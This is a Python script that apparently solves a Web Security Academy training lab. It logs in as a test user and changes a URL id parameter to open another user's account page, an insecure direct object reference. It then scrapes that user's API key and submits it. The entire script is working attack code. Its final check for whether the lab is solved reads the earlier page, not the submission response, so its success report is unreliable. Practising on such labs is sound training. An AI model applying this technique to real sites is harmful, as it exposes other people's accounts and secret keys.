import requests, re
from bs4 import BeautifulSoup

site = "0a4200e103e6317e81b2202e00a100f1.web-security-academy.net/"
s = requests.Session()

# Step 1: Log in as wiener
login_url = f"https://{site}/login"
login_data = {
    'username': 'wiener',
    'password': 'peter'
}
s.post(login_url, data=login_data)

# Step 2: Access Carlos' account directly by changing the user ID in URL
profile_url = f"https://{site}/my-account?id=carlos"
resp = s.get(profile_url)
soup = BeautifulSoup(resp.text, 'html.parser')

# Step 3: Extract API key
div_text = soup.find('div', string=re.compile('API')).text
api_key = div_text.split(' ')[4]
print(f"[✓] Retrieved API key: {api_key}")

# Step 4: Submit the solution
submit_url = f"https://{site}/submitSolution"
resp = s.post(submit_url, data={'answer': api_key})
lab_status = soup.find('div', class_='widgetcontainer-lab-status is-solved')
if lab_status:
    print("[✓] Lab solved and API key submitted successfully.")
else:
    print("[!] Submission sent, but lab not confirmed as solved.")